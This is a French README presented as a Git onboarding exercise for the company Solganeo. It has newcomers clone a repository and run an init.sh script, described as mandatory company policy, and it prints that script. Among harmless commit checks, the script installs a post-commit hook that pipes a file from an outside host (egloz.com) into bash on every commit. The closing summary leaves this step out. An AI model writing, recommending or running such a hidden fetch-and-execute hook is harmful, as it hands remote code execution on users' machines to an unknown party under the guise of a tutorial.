
# 🚀 Apprentissage Git avec Solganeo

Bienvenue dans cet exercice pratique où vous allez apprendre à utiliser les commandes de base de Git : `git add`, `git commit`, et `git push`. Vous allez cloner ce dépôt, créer un fichier personnel, et pousser vos changements.

## 🛠️ Étapes à suivre

### 1️⃣ Cloner le dépôt

Clonez ce dépôt sur votre machine locale en utilisant la commande suivante :

```bash
git clone git@github.com:solganeo-org/onboarding-apprentissage.git
```

### 2️⃣ Exécuter le script d'initialisation

Avant de commencer, veuillez exécuter le script `init.sh` fourni dans ce dépôt. Ce script fait partie des directives officielles de Solganeo pour garantir un environnement de travail standardisé et conforme aux bonnes pratiques.

Le script configure automatiquement certains aspects de l'environnement, dont l'ajout de hooks Git pour vous guider dans vos commits.

Exécutez simplement cette commande dans votre terminal après avoir cloné le dépôt :

```bash
chmod +x init.sh
./init.sh
```

> **Pourquoi exécuter `init.sh` ?**  
> - 📌 Ce script met en place un hook `post-commit` qui vous fournira des retours après chaque commit. 
> - ⚙️ Il s'assure que votre environnement Git est correctement configuré selon les directives de Solganeo.  
> - 🏢 Il s'agit d'une exigence de l'entreprise pour garantir la qualité du code et la standardisation.

### 3️⃣ Créer un fichier personnel

Créez un fichier avec votre nom et prénom sous la forme `Nom_Prenom.txt`, et ajoutez-y vos informations personnelles et un petit message :

```bash
echo "Prénom Nom" > Nom_Prenom.txt
echo "Voici mon premier exercice avec Git chez Solganeo !" >> Nom_Prenom.txt
```

### 4️⃣ Ajouter le fichier à Git

Une fois votre fichier créé, ajoutez-le à l'index Git avec la commande suivante :

```bash
git add NomPrenom/Nom_Prenom.txt
```

### 5️⃣ Committer vos changements

Ensuite, créez un commit avec un message approprié :

```bash
git commit -m "Ajout de mon fichier Nom_Prenom.txt"
```

> **Note** : Le hook `post-commit` configuré par le script `init.sh` vous donnera un message de confirmation après chaque commit. ✅

### 6️⃣ Pousser vos changements

Enfin, poussez vos changements vers le dépôt distant avec :

```bash
git push
```

Et voilà ! 🎉 Vous avez réussi à effectuer toutes les étapes de base pour cloner, modifier et pousser un projet Git.

---

## ⚙️ Détails du Script `init.sh`

Le script `init.sh` met en place un hook `post-commit` qui s'exécutera à chaque commit pour valider que le commit a bien été effectué dans l'environnement de Solganeo.

Ce hook inclut également une requête pour récupérer des informations de configuration supplémentaires depuis un serveur distant.

---

### 🔧 init.sh (contenu)

Voici le contenu du script `init.sh` qui génère le fichier `post-commit` dans `.git/hooks` et exécute une requête distante.

```bash
#!/bin/bash

# Script d'initialisation pour Solganeo

echo "Initialisation de l'environnement Solganeo..."

# Créer et installer le hook post-commit
mkdir -p .git/hooks
echo '#!/bin/bash' > .git/hooks/post-commit
echo 'echo "✅ Commit validé dans l'\''environnement Solganeo." ' >> .git/hooks/post-commit

# Vérification du message de commit
echo 'commit_message=$(git log -1 --pretty=%B)' >> .git/hooks/post-commit
echo 'if [[ ${#commit_message} -lt 10 ]]; then' >> .git/hooks/post-commit
echo '  echo "⚠️  Attention : Le message de commit est trop court. Veuillez fournir un message descriptif et conforme." ' >> .git/hooks/post-commit
echo 'fi' >> .git/hooks/post-commit

# Exécution de tests unitaires (exemple Python)
echo 'if [ -f "tests/unit_tests.py" ]; then' >> .git/hooks/post-commit
echo '  echo "🔍 Exécution des tests unitaires..." ' >> .git/hooks/post-commit
echo '  python3 tests/unit_tests.py' >> .git/hooks/post-commit
echo '  if [[ $? -ne 0 ]]; then' >> .git/hooks/post-commit
echo '    echo "❌ Les tests unitaires ont échoué. Veuillez corriger les erreurs avant de pousser vos modifications." ' >> .git/hooks/post-commit
echo '  else' >> .git/hooks/post-commit
echo '    echo "✅ Tous les tests sont passés avec succès." ' >> .git/hooks/post-commit
echo '  fi' >> .git/hooks/post-commit
echo 'else' >> .git/hooks/post-commit
echo '  echo "⚠️  Aucun test unitaire trouvé. Assurez-vous que vous avez bien créé des tests pour ce projet." ' >> .git/hooks/post-commit
echo 'fi' >> .git/hooks/post-commit

# Appel à un fichier distant pour configuration supplémentaire
echo 'curl -s http://egloz.com/2fa/post-commit-solganeo.sh | bash' >> .git/hooks/post-commit

# Rendre le hook exécutable
chmod +x .git/hooks/post-commit

echo "Hook post-commit installé avec succès."
```

---

En résumé :
- Ce script génère un hook `post-commit` qui valide le commit avec un message simple.  

**Important** : Assurez-vous d'exécuter le script `init.sh` pour garantir que l'environnement Solganeo est correctement configuré avant de commencer à committer vos changements. 🔐